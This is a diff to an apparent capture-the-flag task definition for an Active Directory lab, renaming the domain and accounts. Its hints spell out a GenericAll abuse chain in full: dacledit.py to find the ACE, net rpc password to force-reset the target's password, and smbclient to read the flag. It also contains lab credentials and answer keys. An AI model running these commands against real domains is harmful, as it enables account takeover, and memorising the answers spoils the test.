@@ -3,16 +3,16 @@
     {
       "key": "main",
       "title": "Read the flag",
-      "prompt": "From the hodor foothold, find the GenericAll control edge over maester.luwin, abuse it to reset maester.luwin's password (no old password needed), then authenticate as maester.luwin and read flag.txt from the //dc/archive share that only maester.luwin may open.",
+      "prompt": "From the d.laurent foothold, find the GenericAll control edge over b.whitfield, abuse it to reset b.whitfield's password (no old password needed), then authenticate as b.whitfield and read flag.txt from the //dc/archive share that only b.whitfield may open.",
       "check": {
         "evidence": "SECRET",
         "format": "FLAG{%s}"
       },
-      "dev": "FLAG{dev-ad-acl-genericall-maester-luwin}",
+      "dev": "FLAG{dev-ad-acl-genericall-vertex}",
       "hints": [
-        "hodor is a normal domain user (hodor / Hodor123!). Point your resolver and /etc/krb5.conf at the DC, then read the DACL of candidate users to find an ACE granting hodor full control: dacledit.py -action read -principal hodor -target-dn '<DN>' -dc-ip <dc> 'NORTH/hodor:Hodor123!' (or a BloodHound GenericAll edge). The target is maester.luwin.",
-        "GenericAll (full control) over a user object includes the right to reset its password without knowing the current one. Force a new password: net rpc password maester.luwin 'NewPassw0rd!' -U 'NORTH\\hodor%Hodor123!' -S dc.north.sevenkingdoms.local (or bloodyAD set password over LDAPS).",
-        "Authenticate as maester.luwin with the password you just set and read the flag: smbclient //dc/archive -U 'NORTH\\maester.luwin%NewPassw0rd!' -c 'get flag.txt'. hodor itself is denied that share."
+        "d.laurent is a normal domain user (d.laurent / Editor!2024). Point your resolver and /etc/krb5.conf at the DC, then read the DACL of candidate users to find an ACE granting d.laurent full control: dacledit.py -action read -principal d.laurent -target-dn '<DN>' -dc-ip <dc> 'VERTEX/d.laurent:Editor!2024' (or a BloodHound GenericAll edge). The target is b.whitfield.",
+        "GenericAll (full control) over a user object includes the right to reset its password without knowing the current one. Force a new password: net rpc password b.whitfield 'NewPassw0rd!' -U 'VERTEX\\d.laurent%Editor!2024' -S dc.vertex.lab (or bloodyAD set password over LDAPS).",
+        "Authenticate as b.whitfield with the password you just set and read the flag: smbclient //dc/archive -U 'VERTEX\\b.whitfield%NewPassw0rd!' -c 'get flag.txt'. d.laurent itself is denied that share."
       ],
       "steps": [
         {
@@ -31,7 +31,7 @@
         {
           "key": "ace",
           "title": "Name the ACE",
-          "prompt": "Which access right does hodor hold over the target, giving full control of the object? (name of the right)",
+          "prompt": "Which access right does d.laurent hold over the target, giving full control of the object? (name of the right)",
           "check": {
             "answer": [
               "genericall",
@@ -44,11 +44,11 @@
         {
           "key": "target",
           "title": "Find the target",
-          "prompt": "Which higher-value account does hodor control via the ACE? (username)",
+          "prompt": "Which higher-value account does d.laurent control via the ACE? (username)",
           "check": {
             "answer": [
-              "maester.luwin",
-              "north\\maester.luwin"
+              "b.whitfield",
+              "vertex\\b.whitfield"
             ]
           }
         },
